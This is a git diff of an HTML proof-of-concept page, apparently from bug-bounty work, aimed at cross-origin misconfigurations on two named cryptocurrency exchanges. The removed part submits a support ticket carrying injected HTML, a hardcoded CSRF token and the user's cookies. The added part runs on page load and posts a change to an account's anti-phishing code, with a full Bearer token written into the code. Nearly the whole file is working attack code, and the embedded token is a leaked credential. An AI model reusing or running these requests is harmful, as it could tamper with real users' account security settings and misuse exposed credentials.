@@ -1,38 +1,42 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>CORS Exploit PoC</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Test PoC</title>
+    <script>
+        function sendRequest() {
+            const url = 'https://api.woox.io/woo/account/anti_phishing_code';
+            const payload = {
+                "anti_phishing_code": "1111",
+                "code": ""
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json;charset=utf-8',
+                    'Authorization': 'Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJzeW1leGFtZUBjeWNsZWxvdmUuY2MiLCJyYW5kb20iOiJreEVHakkiLCJhdXRoX3R5cGUiOiIxIiwidXNlcl9pZCI6MjUyNjQwLCJzY29wZXMiOiJhc3NldCxvcmRlcmJvb2ssb3JkZXI6aW9jLG9yZGVyOmZvayxvcmRlcjpsaW1pdCxvcmRlcjptYXJrZXQsb3JkZXI6cG9zdG9ubHksdHJhZGUsc2VjdXJpdHksb3JkZXI6YXNrLG9yZGVyOmJpZCx0cmFkaW5nIiwiZXhwaXJlX2luIjo2MDQ4MDAsInZlcnNpb24iOjE2LCJjbGllbnRfaWQiOiJiZDkzZDQxMS0yYmFkLTQ1MmUtODlhOS0wMDQ5MzNjOThiYTQiLCJleHAiOjE3MzY4NjU1MTksImlzcyI6IldPT1RSQURFIiwiaWF0IjoxNzM2MjYwNzE5fQ.hWuodLDaArogthX7_5WnM5v3S76L61Vt153JRRK8hsGYmUN3pwyEhX23aP9dD-_ZbM7ljmJ43NxibsBnYL5WGvmea_oXRjxuNNoKkLxCFdG9sbmoYFyWsnO30oegULvSQeujK-4kX_xKCRdweIqjFBKkSBS-hE6XDy8kAIfK3UsF1WWUdb_8ztw3zSPC3dh-vYBv1Fz04LOXLE7EvfGCKksQ_nojnXaaqORC7KHfiXXH_lS6uZ3KV3LSYOYEc_6Vd6BCz-eNeJULtbLoyDECCm8OpatiG_a5a-n4L4gP6CMwTucdRthehDv3qQpgzlUgT5xImvLoBMMYCplrnSlGog', // Replace with the actual Bearer token
+                    'Origin': 'https://varad4-0-4.github.io/covid19partnersplatform-dev/', // Simulating an origin from GitHub
+                },
+                body: JSON.stringify(payload),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Response:', data);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+
+        window.onload = function() {
+            sendRequest();
+        };
+    </script>
 </head>
 <body>
-    <h1>Exploit PoC</h1>
-    <button id="exploit">Exploit</button>
-    <pre id="response"></pre>
-
-    <script>
-        document.getElementById("exploit").addEventListener("click", () => {
-            fetch("https://support.bitexenglobal.com/portal/api/tickets?portalId=edbsnec74a7af888c57f616ce2c38590753254077661132ba79326c1f0fd19db2fcc9", {
-                method: "POST",
-                credentials: "include", // Send cookies along with the request
-                headers: {
-                    "Content-Type": "application/json",
-                    "X-Zcsrf-Token": "crmcsrfparam=408820809d0e1ee701a9e4f2d85df8d5a7c8a3ec2826e0b6bb6bab54bcfe5055ff6d93a93d87f48dc94ccb30b90a2fca7dfc0e8749a53c4a000c3b0f63d53dc0"
-                },
-                body: JSON.stringify({
-                    departmentId: "484276000450140029",
-                    layoutId: "484276000450354782",
-                    subject: "<h1>dd</h1>",
-                    category: "Alım/Satım İşlemleri",
-                    subCategory: "Alış Satış Fiyat Farkı",
-                    phone: "<h1>dd</h1>",
-                    description: "mm"
-                })
-            })
-            .then(response => response.text())
-            .then(data => {
-                document.getElementById("response").textContent = data;
-            })
-            .catch(err => console.error("Request failed", err));
-        });
-    </script>
+    <h1>CORS Test PoC</h1>
+    <p>If the CORS misconfiguration is present, you should see a response in the console.</p>
 </body>
 </html>
